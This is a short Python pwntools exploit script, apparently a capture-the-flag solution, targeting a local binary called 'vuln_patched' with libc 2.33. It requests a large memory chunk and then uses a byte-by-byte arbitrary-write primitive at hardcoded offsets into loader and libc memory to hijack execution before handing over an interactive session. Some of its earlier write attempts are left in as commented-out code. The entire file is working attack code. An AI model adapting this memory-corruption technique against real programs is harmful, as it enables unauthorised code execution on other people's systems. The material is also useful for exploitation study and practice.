#!/usr/bin/env python3

from pwn import *

exe = ELF("vuln_patched")
libc = ELF("./libc-2.33.so")
ld = ELF("./ld-2.33.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r

r = conn()

def start_chunk(size):
    r.sendline(hex(size))

def write_at_offset(offset, c): # ex [100, 101, 102] ["A", "B", "C"]

    for i in range(len(offset)):
        r.sendline(hex(offset[i]) + " " + hex(ord(c[i])))

def main():
    
    pause()
    start_chunk(0x100000)

    pause()
    r.sendline(hex(5))
    pause()

    #offset I need = 0x72f36

    write_at_offset([0x7ffff7ffe288-(0x00007ffff7cf6000 + 0x10 - 1)], ["\x85"])
    write_at_offset([0x7ffff7ffe288-(0x00007ffff7cf6000 + 0x10 + 0)], ["\xf8"])
    

    write_at_offset([0x2c4880], ["\xe0"])
    write_at_offset([0x2c4880 + 1], ["\x2d"])
    write_at_offset([0x2c4880 + 2], ["\xe4"])

    """
    write_at_offset([0x3081d0], ['\x36'])
    write_at_offset([0x3081d0 + 1], ['\x2f'])
    write_at_offset([0x3081d0 + 2], ['\x72'])
    write_at_offset([0x3081d0 + 3], ['\x00'])
    write_at_offset([0x3081d0 + 4], ['\x00'])
    write_at_offset([0x3081d0 + 5], ['\x00'])
    """

    start_chunk(0x100000)
    
    pause()
    r.sendline(hex(8))
    pause()

    #offset I need = 0x72f36

    #write_at_offset([0x3081d0], ["\x28"])
    #write_at_offset([0x3081d0 + 1], ["\x42"])
    
    write_at_offset([0x3081d0 + 0x100000], ['\x36'])
    write_at_offset([0x3081d0 + 1 + 0x100000], ['\x2f'])
    write_at_offset([0x3081d0 + 2 + 0x100000], ['\x07'])
    write_at_offset([0x3081d0 + 3 + 0x100000], ['\x00'])
    write_at_offset([0x3081d0 + 4 + 0x100000], ['\x00'])
    write_at_offset([0x3081d0 + 5 + 0x100000], ['\x00'])

    write_at_offset([0x3082e0 + 0x100000], ["\xc0"])
    write_at_offset([0x3082e0 + 1 + 0x100000], ["\x7f"])


    r.interactive()


if __name__ == "__main__":
    main()
